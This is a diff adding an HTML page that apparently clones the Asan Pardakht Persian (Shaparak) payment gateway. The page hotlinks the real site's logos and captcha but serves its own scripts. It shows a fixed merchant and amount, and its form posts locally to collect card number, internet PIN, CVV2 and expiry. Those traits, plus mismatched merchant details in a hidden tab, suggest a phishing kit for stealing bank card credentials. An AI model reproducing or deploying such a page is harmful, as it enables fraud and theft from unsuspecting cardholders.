@@ -1,0 +1,354 @@
+
+<!DOCTYPE html>
+
+<html>
+<head>
+	<meta http-equiv="Content-Language" content="fa">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="X-CSRF-Token" content="123"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>.: آسان پرداخت پرشين | درگاه پرداخت اينترنتی :.</title>
+	
+	<link href="css/bootstrap.min.css" rel="stylesheet" />
+    
+    <link href="css/bootstrap-responsive.min.css" rel="stylesheet" />
+    
+    <link href="css/3.css" rel="stylesheet" />
+
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	
+	<link href="css/5.css" rel="stylesheet" type="text/css">	
+    <!--[if IE 7]>
+        <link href="css/bootstrap/font-awesome-ie7.min.css" rel="stylesheet" />
+    <![endif]-->
+    <!--[if IE 8]>
+        <style type="text/css">
+        .navbar-inner{
+            filter:none;
+        }
+         </style>
+	 <![endif]-->
+	 
+     <link rel="stylesheet" type="text/css" href="css/custom.css">
+
+</style>		
+</head>
+<body>
+
+	<div id="OutputTxt">
+
+		<div id="PS_ePayment_GateWay">
+			<div class="row-fluid" id="demo-3">
+				<div class="span10 offset1">
+				<!--
+				<img src="img/sx.png" style="display:block;" />
+                <div class="ipgheader"></div>
+                <img src="img/s5.gif" style="display:block;" />
+            -->
+            <div style="display: flex; background:#fff; margin-bottom: 10px; margin-top: 10px; 
+            -o-box-shadow: 0 0 4px rgba(0,0,0,.4);-ms-box-shadow: 0 0 4px rgba(0,0,0,.4);
+            -moz-box-shadow: 0 0 4px rgba(0,0,0,.4);-webkit-box-shadow: 0 0 4px rgba(0,0,0,.4);box-shadow: 0 0 4px rgba(0,0,0,.4);				
+            ">
+            <div class="span6 headlogo" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+            	<img src="https://asan.shaparak.ir/img/Untitled-2.jpg" style="float:left;" />
+            </div>
+            <div class="span6 headlogo" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+            	<img src="https://asan.shaparak.ir/img/logosh.jpg" style="float: right;" />
+            </div>
+        </div>
+        <div class="tabbable custom-tabs tabs-right tabs-animated  flat flat-all hide-label-980 shadow  track-url auto-scroll">
+        	<ul class="nav nav-tabs">
+        		<li class="active"><a href="#panel3-1" data-toggle="tab" class="active "><span>انجام تراکنش</span>&nbsp;&nbsp;<i class="fas fa-lock" style="color:#cd6969"></i></a></li>                        
+
+						<!--
+						<li><a href="#panel3-2" data-toggle="tab"><span>هویت پذیرنده</span>&nbsp;&nbsp;<i class="icon-user"></i></a></li>
+					-->
+
+					<li><a href="#panel3-3" data-toggle="tab"><span>توصیه ها</span>&nbsp;&nbsp;<i style="color:#cd6969" class="fas fa-key"></i></a></li>
+
+						<!--
+						<li><a href="#panel3-4" data-toggle="tab"><span>اطلاعات تماس</span>&nbsp;&nbsp;<i class="icon-envelope-alt"></i></a></li>
+					-->
+
+				</ul>
+				<div class="tab-content ">
+					<div class="tab-pane active" id="panel3-1" dir="rtl">
+						<div class="row-fluid">                                
+							<div class="span6">
+								<h4><i class="fas fa-shopping-cart icon-large" style="font-size: 13pt"></i>&nbsp;&nbsp;اطلاعات خرید</h4>
+								<div class="box" style="line-height:20px;">
+									<p>
+										نام پذیرنده :
+										<br />
+										<span>کافه بازار</span>
+									</p>
+									<p>
+										کد پذیرنده / ترمينال:
+										<br />
+										<span>134566 / 4378956</span>
+									</p>
+
+									<p>
+										نشانی سايت پذيرنده:
+										<br />
+										<span>																						
+											https://cafebazaar.ir
+										</span>
+									</p>
+
+									<p>
+										مبلغ تراکنش :
+										<br />
+										<span style="font:11pt IRANSans;">
+											&#1777;&#1776;,&#1776;&#1776;&#1776;
+											<span style="font:11px IRANSans;">ریال</span></span>
+										</p>
+									</div>
+									<div style="background:#e0e0e0; text-align:right; font:10pt IRANSans; color: #333; margin-top:-10px; padding-right: 10px">
+										زمان باقيمانده: <span class="GateTimer" style="text-align:left; font:12pt/30px IRANSans; color:#666"></span>											
+									</div>  									
+								</div>
+
+								<div class="span6">
+									<form method="POST" name="epay_gateway_form" id="epay_gateway_form" style="padding:0; margin:0">
+										<input type="hidden" name="price" value="7830000">
+										<input type="hidden" name="bankname" id="bankname" value="">
+										<h4><i class="fas fa-credit-card" style="font-size: 13pt"></i>&nbsp;&nbsp; اطلاعات کارت</h4>
+
+										<label class="inputstyler">شماره کارت
+											<span style="font:bold 11px IRANSans; padding-right:2px; color:#d00" id="GatewayFetchBankNameDiv"></span>
+										</label>
+										<input type="tel" pattern="\d{16}" autocomplete="off" name="cardnumber" id="cardnumber" maxlength="16" dir="ltr" class="span12 text-left" />
+
+										<label class="inputstyler">رمز اينترنتی (رمز دوم)</label>
+										<input type="password" pattern="\d{12}" autocomplete="off" id="secondpass" name="secondpass" value="" maxlength="13" dir="ltr" class="input-block-level" inputmode="numeric" />
+										<label class="inputstyler">کد CVV2</label>
+										<input type="password" pattern="\d{5}" autocomplete="off" id="cvv2" name="cvv2" value="" maxlength="5" dir="ltr" class="input-block-level" inputmode="numeric" />
+										<label class="inputstyler">تاریخ انقضای کارت</label>
+										<div class="expdatealert alert alert-info" dir="rtl" style="display:none; padding: 3px 5px 0; margin:10px 0; font-weight:bold; font-size: 11px;">
+											در صورت نياز می‌توانيد تاريخ انقضا را ويرايش نمائيد.
+										</div>									
+										<div class="row">
+											<div class="span2" style="float:right;">
+												<label for="expmah" class="control-label inputstyler">ماه</label>                                    
+												<input type="tel" pattern="\d{16}" autocomplete="off" id="expmah" name="expmah" maxlength="2" dir="ltr" class="span11 text-center" style="font:11pt Tahoma,sans-serif" />
+												<input type="hidden" name="expmahnew" />
+											</div>
+											<div class="span2" style="float:right;">
+												<label for="expyear" class="control-label inputstyler">سال</label>
+												<input type="tel" pattern="\d{16}" autocomplete="off" id="expyear" name="expyear" maxlength="2" dir="ltr" class="span12 text-center" style="font:11pt Tahoma,sans-serif" />
+												<input type="hidden" name="expyearnew"/>
+											</div>
+											<div class="span8 text-center" style="float:right;">
+												<!--<div style="">-->
+													<label class="inputstyler text-right">کد امنیتی</label>									
+													<input type="tel" pattern="\d{16}" autocomplete="off" name="captchcode" id="captchacode" maxlength="5" dir="ltr" class="numeric span4 text-center" style="float:right;14px tahoma,sans-serif; padding-left:2px; padding-right:2px;" />
+													<img id="imgCaptchaGateway" src="https://asan.shaparak.ir/captcha.asp" style="float:right; display: block; max-width: 100%; height:auto; vertical-align:middle;" />
+													<a title="تغيير تصوير" href="javascript:void(0)" onclick="RefreshImage('imgCaptchaGateway')"><img alt="تغيير تصوير" src="https://asan.shaparak.ir/img/ico_refresh.png"  style="float:right; margin-top:3px; border:0; width:24px; height:24px; vertical-align:middle"></a>
+												</div>
+											</div>
+
+											<div class="row">
+
+												<div class="span6" style="float:right;">										
+													<input type="tel" pattern="\d{16}" placeholder="موبايل(اختياری)" name="mobileforipg" id="mobileforipg" value="" autocomplete="on" maxlength="11" dir="rtl" class="numeric span11" style="font:11px Tahoma,sans-serif" />
+												</div>
+												<div class="span6" style="float:right;">
+													<input type="text" placeholder="ايميل(اختياری)" name="emailforipg" id="emailforipg" value="" autocomplete="on" maxlength="50" dir="rtl" class="span11" style="font:11px tahoma,sans-serif" />
+												</div>
+
+											</div>
+									<!--
+										<div style="clear:both"></div>
+										<div style="display: flex; text-align: right; direction: rtl;">
+											
+												<input type="text" placeholder="ايميل(اختياری)" name="emailforipg" id="emailforipg" value="" autocomplete="on" maxlength="50" dir="rtl" class="span11" style="font:11px tahoma,sans-serif; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-left:5px" />
+												<input  type="tel" pattern="\d{11}" placeholder="موبايل(اختياری)" name="mobileforipg" id="mobileforipg" value="" autocomplete="on" maxlength="11" dir="rtl" class="span11" style="font:11px tahoma,sans-serif; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" />
+											
+										</div>
+									-->
+									<div style="clear:both"></div>																				
+									<div id="GatewayInputError"></div>										
+									<div style="clear:both"></div>										
+									<button type="button" id="pardakht" class="paymentap btn btn-labeled btn-success"><span class="btn-label"><i class="fas fa-check" style=""></i></span><span style="padding-right: 24px; padding-left: 24px">پرداخت</span></button>
+									<button type="button" id="enseraf" class="btn btn-labeled btn-default"><span class="btn-label"><i class="fas fa-times" style=""></i></span>انصراف</button>									
+								</form>
+							</div>
+						</div>
+					</div>
+					<div class="tab-pane" id="panel3-2">
+						<div class="row-fluid">
+							<div class="span5" dir="rtl">
+								<h4><i class="fas fa-icon-user"></i>&nbsp;&nbsp; لوگوی پذیرنده</h4>
+								<div style="width:100%; min-height:100%;
+								background-image:url(https://asan.shaparak.ir/img/logo/merchant/921062.png); background-position:50% 0%; 
+								background-repeat:no-repeat; display:inline-block;"> 
+								<img src="https://asan.shaparak.ir/img/s3.png" style="width:100%; height:100%;"> 
+							</div>
+						</div>
+
+						<div class="span7" dir="rtl">
+							<h4><i class="fas fa-question"></i>&nbsp;&nbsp;هویت پذیرنده</h4>
+							<div class="box" style="line-height:20px;">
+								<p >
+									نام پذیرنده :
+									<br />
+									<span>زرين پال</span>
+								</p>
+								<p>
+									نام مدیر/صاحب درگاه پرداخت :
+									<br />
+									<span>حسين اميري</span>
+								</p>
+								<p>
+									کد پذیرنده :
+									<br />
+									<span>921062</span>
+								</p>
+								<p>
+									حوزه اصلی فعالیت پذیرنده :
+									<br />
+									<span>ارائه دهنده خدمات اينترنت</span>
+								</p>
+								<p>
+									نشانی پذیرنده :
+									<br />
+									<span>خيابان يوسف آباد، خيابان بيستم، پلاک 61، واحد 4</span>
+								</p>
+								<p>
+									تلفن تماس پذیرنده :
+									<br />
+									<span>88671000</span>
+								</p>
+								<p>
+									آدرس ایمیل پشتیبانی پذیرنده :
+									<br />
+									<span>info@zarinpal.com</span>
+								</p>
+							</div>  
+						</div>
+					</div>
+				</div>
+
+				<div class="tab-pane" id="panel3-3">
+					<div class="row-fluid">
+
+						<div class="span12" dir="rtl">
+							<h4><i class="fas fa-question"></i>&nbsp;&nbsp;توصیه های امنیتی و راهنمایی ها</h4>
+							<div class="box">
+								<p>نکات امنیتی</p>
+								<ul>
+									<li>
+
+										درگاه پرداخت اینترنتی آسان پرداخت با استفاده از پروتکل امن SSL به مشتریان خود ارایه خدمت نموده و با آدرس https://asan.shaparak.ir شروع می شود. خواهشمند است به منظور جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق مقایسه نمایید و درصورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید.
+
+									</li>
+									<li>از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.</li>
+									<li>برای جلوگیری از افشای رمز کارت خود، حتی المقدور از صفحه کلید مجازی استفاده فرمایید.</li>
+									<li>برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با ما تماس بگیرید.</li>                           
+								</ul>
+
+							</div>
+							<div class="box">
+								<p>راهنمایی ها</p>
+								<ul>
+									<li>برای انجام تراکنش های اینترنتی باید، رمز دوم یا رمز اینترنتی برای کارت خود دریافت نموده باشید. این رمز با رمز اول که در خرید از پایانه های فروش یا دریافت وجه از خودپرداز استفاده می شود متفاوت است.</li>
+									<li>کد CVV2 بر روی کارت یا پشت کارت شما درج شده و متشکل از سه یا چهار رقم است</li>
+									<li>تاریخ انقضا روی کارت شما درج شده است. در هنگام وارد کردن سال انقضا صرفا باید آنرا بصورت دو رقمی وارد نمایید</li>
+
+								</ul>
+
+							</div>
+						</div>
+					</div>
+
+
+				</div>
+				<div id="panel3-4" class="tab-pane" dir="rtl">
+					<div class="row-fluid">
+
+						<div class="span12">
+							<div class="row-fluid">
+								<div class="span12">
+									<h4><i class="fas fa-map-marker"></i>&nbsp;&nbsp;آسان پرداخت روی نقشه</h4>
+
+									<div class="map"></div>
+
+								</div>
+							</div>
+							<div class="row-fluid">
+								<div class="span6">
+									<h4><i class="icon-envelope-alt"></i>&nbsp;&nbsp;تماس الکترونیکی</h4>
+									<address>
+										<strong>پشتیبانی درگاه اینترنتی</strong><br>
+										vpos[at]persianswitch.com
+									</address>
+								</div>
+								<div class="span6">
+									<h4><i class="icon-location-arrow"></i>&nbsp;&nbsp;آدرس ما</h4>
+
+									<address>
+										<strong>شرکت آسان پرداخت پرشین</strong><br>
+										تهران، خیابان کریمخان زند<br>
+										ابتدای خردمند جنوبی، پلاک 69<br>
+										تلفن:<br>
+										83333-(021)
+									</address>
+								</div>
+
+							</div>
+
+						</div>
+					</div>
+				</div>
+
+			</div>
+
+		</div>
+		<img src="https://asan.shaparak.ir/img/sx.png" style="display:block;" />
+		<div style="width:100%; height:30px; font-family:IRANSans; color:#333; text-align:center; font-size:11px;line-height: 16pt">
+			<div class="span12" dir="rtl" style="font-family:IRANSans; color:#333; text-align:center; 
+			font-size:11px;line-height: 16pt">کلیه حقوق برای شرکت آسان پرداخت محفوظ است. 
+			<br>
+			تماس: 02183333
+			<div class="span12" dir="rtl" style="display: none">
+				<img alt="شبکه الکترونیکی پرداخت کارت شاپرک" title="شبکه الکترونیکی پرداخت کارت شاپرک" src="https://asan.shaparak.ir/img/logo_shaparak.png" style="width:60px; height:38px; border:3px solid #ccc;" />
+				<img alt="آسان پرداخت پرشين (آپ)" title="آسان پرداخت پرشين (آپ)" src="img/logo_ap.png" style="width:40px; height:38px; border:3px solid #ccc;" />
+				<img src="https://asan.shaparak.ir/img/logo_ssl.png" style="width:95px; height:38px; border:3px solid #ccc;" />
+			</div>
+
+		</div>
+	</div>
+	<br />
+</div>  
+
+</div>
+</div>                            
+</div>
+
+<div class="modal modal-loading-bar" style="width:300px">
+ <div class="modal-dialog">
+   <div class="modal-content">
+     <div class="modal-body">		
+		<div class="progress progress-striped progress-danger active">
+		   <div class="bar six-sec-ease-in-out" aria-valuetransitiongoal="100" style="font-family:IRANSans; font-size:13px"></div>
+		</div>
+     </div>
+   </div>
+ </div>
+</div>
+
+
+
+
+<script type="text/javascript" src="js/jquery.min.js"></script>
+<script type="text/javascript" src="js/bootstrap.min.js"></script>
+<script type="text/javascript" src="js/tabs-addon.js"></script>
+<script type="text/javascript" src="js/jquery.keypad.js"></script>
+<script type="text/javascript" src="js/jquery.numeric.js"></script>
+<script type="text/javascript" src="js/function.js"></script>
+<script type="text/javascript" src="js/external.js"></script>
+	
+
+</body>
+</html>
